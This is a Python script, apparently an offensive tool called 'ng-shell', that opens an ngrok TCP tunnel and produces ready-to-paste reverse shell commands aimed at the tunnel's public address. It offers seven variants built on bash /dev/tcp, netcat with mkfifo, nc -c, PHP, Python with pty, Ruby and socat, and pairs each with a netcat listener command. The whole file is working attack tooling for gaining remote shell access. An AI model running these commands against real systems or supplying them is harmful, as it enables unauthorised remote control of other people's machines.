#!/usr/bin/python3

import subprocess, socket, re, requests
from time import sleep


g = "\033[1;32m"
r = "\033[1;31m"
y = "\033[1;33m"
reset = "\033[0m"

banner = """
 ______  _______        _______ ___ ___ _______ ___     ___     
|   _  \|   _   |______|   _   |   Y   |   _   |   |   |   |    
|.  |   |.  |___|______|   1___|.  1   |.  1___|.  |   |.  |    
|.  |   |.  |   |      |____   |.  _   |.  __)_|.  |___|.  |___ 
|:  |   |:  1   |      |:  1   |:  |   |:  1   |:  1   |:  1   |
|::.|   |::.. . |      |::.. . |::.|:. |::.. . |::.. . |::.. . |
`--- ---`-------'      `-------`--- ---`-------`-------`-------'
                                                                
     	      <--- Tool by N4s1rl1 --->                     
                                                                
"""

print(f"{g}{banner}{reset}")

print(f"{g}Enter the port you want to use{reset}")
port = input(f"{g}ng-shell --> {reset}")

print(f"\n{g}Starting Ngrok in a new terminal window...{reset}")
print(f"{y}Warning: Do not close the newly opened terminal for Ngrok to work!{reset}")

sleep(2)
subprocess.Popen(['gnome-terminal', '--', 'ngrok', 'tcp', port])

print(f"{g}Waiting for Ngrok to start...{reset}")

sleep(5) 

try:
    response = requests.get('http://localhost:4040/api/tunnels')
    response.raise_for_status()
    data = response.json()
    
    if 'tunnels' in data and len(data['tunnels']) > 0:
        tunnel = data['tunnels'][0]
        domain = re.sub(r'^tcp://', '', tunnel['public_url'])
        remote_port = domain.split(':')[-1]
        ip_address = socket.gethostbyname(domain.split(':')[0])
    else:
        print(f"{r}No tunnels found.{reset}")
        exit()
except requests.RequestException as e:
    print(f"{r}Failed to fetch Ngrok tunnel information: {e}{reset}")
    exit()

sleep(0.3)
print(f"\n{g}Select the reverse shell you want to generate{reset}")
print(f"\n{r}[1] {g}bash -i{reset}")
print(f"{r}[2] {g}nc mkfifo{reset}")
print(f"{r}[3] {g}nc -c{reset}")
print(f"{r}[4] {g}php{reset}")
print(f"{r}[5] {g}python{reset}")
print(f"{r}[6] {g}ruby{reset}")
print(f"{r}[7] {g}socat (TTY){reset}")
print(f"\n{g}Enter the number of the reverse shell{reset}")

ng_shell = input(f"\n{g}ng-shell --> {reset}")

if ng_shell == "1":
    reverse_shell = f"sh -i >& /dev/tcp/{ip_address}/{remote_port} 0>&1"
elif ng_shell == "2":
    reverse_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip_address} {remote_port} >/tmp/f"
elif ng_shell == "3":
    reverse_shell = f"nc -c sh {ip_address} {remote_port}"
elif ng_shell == "4":
    reverse_shell = f'php -r \'$sock=fsockopen("{ip_address}",{remote_port});system("sh <&3 >&3 2>&3");\''
elif ng_shell == "5":
    reverse_shell = f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip_address}", {remote_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")\''
elif ng_shell == "6":
    reverse_shell = f'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip_address}",{remote_port}))\''
elif ng_shell == "7":
    reverse_shell = f'socat TCP:{ip_address}:{remote_port} EXEC:\'sh\',pty,stderr,setsid,sigint,sane'
else:
    print(f"\n{r}Invalid selection.{reset}")
    exit()

sleep(0.3)
print(f"\n{g}Reverse Shell Command: {reverse_shell}{reset}")
print(f"\n{g}Netcat Listening Command: nc -nvlp {port}{reset}")

print(f"\n{g}If you want to stop Ngrok, use the following command:{reset}")
print(f"{g}kill $(ps aux | grep 'ngrok tcp {port}' | grep -v grep | awk '{{print $2}}'){reset}")
